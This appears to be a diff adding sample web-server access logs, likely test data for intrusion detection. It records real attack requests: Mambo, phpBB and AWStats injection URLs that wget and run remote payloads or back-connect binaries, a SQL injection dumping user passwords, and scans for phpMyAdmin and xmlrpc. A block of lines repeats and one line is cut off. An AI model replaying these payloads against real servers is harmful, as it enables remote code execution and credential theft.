@@ -1,0 +1,77 @@
+192.168.2.20 - - [28/Jul/2006:10:27:10 -0300] "GET /cgi-bin/try/ HTTP/1.0" 200 3395
+127.0.0.1 - - [28/Jul/2006:10:22:04 -0300] "GET / HTTP/1.0" 200 2216
+127.0.0.1 - - [28/Jul/2006:10:27:32 -0300] "GET /hidden/ HTTP/1.0" 404 7218
+193.91.75.11 - - [18/Aug/2006:13:23:13 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+212.227.132.51 - - [18/Aug/2006:05:24:07 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.openkid.co.kr/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.openkid.co.kr/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+201.226.254.210 - - [18/Aug/2006:13:47:46 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+212.227.132.51 - - [18/Aug/2006:13:56:29 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+62.103.159.21 - - [18/Aug/2006:13:58:02 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+200.96.104.241 - - [12/Sep/2006:09:44:28 -0300] "GET /modules.php?name=Downloads&d_op=modifydownloadrequest&%20lid=-1%20UNION%20SELECT%200,username,user_id,user_password,name,%20user_email,user_level,0,0%20FROM%20nuke_users HTTP/1.1" 200 9918 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
+85.226.238.xxx "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
+85.226.238.xxx "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
+85.226.238.xxx "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
+85.226.238.xxx "GET /cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
+85.226.238.xxx "GET /cgi-bin/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
+85.226.238.xxx "GET /index2.php?option=com_content&do_pdf=1&id=1index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 637 0
+85.226.238.xxx "GET /index.php?option=com_content&do_pdf=1&id=1index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 637 0
+85.226.238.xxx "GET /mambo/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 584 0
+85.226.238.xxx "GET /cvs/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 584 0
+85.226.238.xxx "GET /cvs/mambo/index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.12/listen;chmod%20744%20listen;./listen;echo%20YYY;echo| HTTP/1.1" "-" 302 584 0
+24.19.40.xxx "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
+64.105.82.xxx "GET /blogtest/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 0
+192.168.2.20 - - [28/Jul/2006:10:27:10 -0300] "GET /cgi-bin/try/ HTTP/1.0" 200 3395
+127.0.0.1 - - [28/Jul/2006:10:22:04 -0300] "GET / HTTP/1.0" 200 2216
+127.0.0.1 - - [28/Jul/2006:10:27:32 -0300] "GET /hidden/ HTTP/1.0" 404 7218
+193.91.75.11 - - [18/Aug/2006:13:23:13 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+212.227.132.51 - - [18/Aug/2006:05:24:07 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.openkid.co.kr/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.openkid.co.kr/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+201.226.254.210 - - [18/Aug/2006:13:47:46 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+212.227.132.51 - - [18/Aug/2006:13:56:29 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+62.103.159.21 - - [18/Aug/2006:13:58:02 -0300] "GET /index.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://www.freewebs.com/nokia-yes/tool.gif?&cmd=cd%20/tmp/;wget%20http://www.freewebs.com/nokia-yes/mambo.txt;perl%20mambo.txt;rm%20-rf%20mambo.*? HTTP/1.0" 200 167 "-" "Mozilla/5.0"
+200.96.104.241 - - [12/Sep/2006:09:44:28 -0300] "GET /modules.php?name=Downloads&d_op=modifydownloadrequest&%20lid=-1%20UNION%20SELECT%200,username,user_id,user_password,name,%20user_email,user_level,0,0%20FROM%20nuke_users HTTP/1.1" 200 9918 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)"
+85.226.238.xxx "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo| HTTP/1.1" "-" 302 547 0
+85.226.238.xxx "GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20216%2e15%2e209%2e12%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e
+202.143.138.46 - - [15/Aug/2007:15:50:42 -0300] "GET /mysqladmin/read_dump.php HTTP/1.1" 404 285 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+202.143.138.46 - - [15/Aug/2007:15:50:42 -0300] "GET /phpmyadmin2/read_dump.php HTTP/1.1" 404 286 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+202.143.138.46 - - [15/Aug/2007:15:50:41 -0300] "GET /phpMyAdmin%202.6.4-rc1/read_dump.php HTTP/1.1" 404 295 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+202.143.138.46 - - [15/Aug/2007:15:50:41 -0300] "GET /admin/phpmyadmin/read_dump.php HTTP/1.1" 404 291 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+202.143.138.46 - - [15/Aug/2007:15:50:41 -0300] "GET /admin/pma/read_dump.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+124.87.40.203 - - [22/Jun/2007:09:02:39 -0300] "POST /dcid/wp-trackback.php?p=9 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:38 -0300] "POST /dcid/wp-trackback.php?p=79 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:37 -0300] "POST /dcid/wp-trackback.php?p=53 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:36 -0300] "POST /dcid/wp-trackback.php?p=5 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:35 -0300] "POST /dcid/wp-trackback.php?p=37 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:31 -0300] "POST /dcid/wp-trackback.php?p=35 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:29 -0300] "POST /dcid/wp-trackback.php?p=26 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:28 -0300] "POST /dcid/wp-trackback.php?p=23 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:27 -0300] "POST /dcid/wp-trackback.php?p=19 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+124.87.40.203 - - [22/Jun/2007:09:02:26 -0300] "POST /dcid/wp-trackback.php?p=18 HTTP/1.0" 401 464 "" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
+202.143.138.46 - - [15/Aug/2007:15:50:40 -0300] "GET /web/phpMyAdmin/read_dump.php HTTP/1.1" 404 289 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+202.143.138.46 - - [15/Aug/2007:15:50:40 -0300] "GET /dbadmin/read_dump.php HTTP/1.1" 404 282 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+202.143.138.46 - - [15/Aug/2007:15:50:40 -0300] "GET /db/read_dump.php HTTP/1.1" 404 277 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+202.143.138.46 - - [15/Aug/2007:15:50:40 -0300] "GET /admin/read_dump.php HTTP/1.1" 404 280 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+202.143.138.46 - - [15/Aug/2007:15:50:39 -0300] "GET /mysql/read_dump.php HTTP/1.1" 404 280 "-" "Mozilla/4.0 (compatible; MSIE 5.00; Windows 98)"
+195.82.6.xxx "GET /modules/Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo| HTTP/1.1" "-" 302 498 0
+195.82.6.xxx "GET /Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo| HTTP/1.1" "-" 302 498 0
+195.82.6.xxx "POST /xmlrpc.php HTTP/1.1" "-" 302 336 0
+195.82.6.xxx "POST /blog/xmlrpc.php HTTP/1.1" "-" 302 336 0
+195.82.6.xxx "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 0
+195.82.6.xxx "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 1
+195.82.6.xxx "POST /drupal/xmlrpc.php HTTP/1.1" "-" 302 336 0
+195.82.6.xxx "POST /phpgroupware/xmlrpc.php HTTP/1.1" "-" 302 336 0
+195.82.6.xxx "POST /wordpress/xmlrpc.php HTTP/1.1" "-" 302 336 0
+195.82.6.xxx "POST /xmlrpc.php HTTP/1.1" "-" 302 336 0
+195.82.6.xxx "POST /xmlrpc/xmlrpc.php HTTP/1.1" "-" 302 336 0
+195.82.6.xxx "POST /xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 0
+81.186.243.xxx "GET /modules/Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo| HTTP/1.1" "-" 302 498 0
+81.186.243.xxx "GET /Forums/admin/admin_styles.phpadmin_styles.php?phpbb_root_path=http://81.174.26.111/cmd.gif?&cmd=cd%20/tmp;wget%20216.15.209.4/criman;chmod%20744%20criman;./criman;echo%20YYY;echo| HTTP/1.1" "-" 302 498 0
+81.186.243.xxx "POST /xmlrpc.php HTTP/1.1" "-" 302 336 1
+81.186.243.xxx "POST /blog/xmlrpc.php HTTP/1.1" "-" 302 336 1
+81.186.243.xxx "POST /blog/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 1
+81.186.243.xxx "POST /blogs/xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 1
+81.186.243.xxx "POST /drupal/xmlrpc.php HTTP/1.1" "-" 302 336 0
+81.186.243.xxx "POST /phpgroupware/xmlrpc.php HTTP/1.1" "-" 302 336 1
+81.186.243.xxx "POST /wordpress/xmlrpc.php HTTP/1.1" "-" 302 336 1
+81.186.243.xxx "POST /xmlrpc.php HTTP/1.1" "-" 302 336 1
+81.186.243.xxx "POST /xmlrpc/xmlrpc.php HTTP/1.1" "-" 302 336 1
+81.186.243.xxx "POST /xmlsrv/xmlrpc.php HTTP/1.1" "-" 302 336 1
+69.65.151.xxx "PROPFIND / HTTP/1.0" "-" 403 332 0
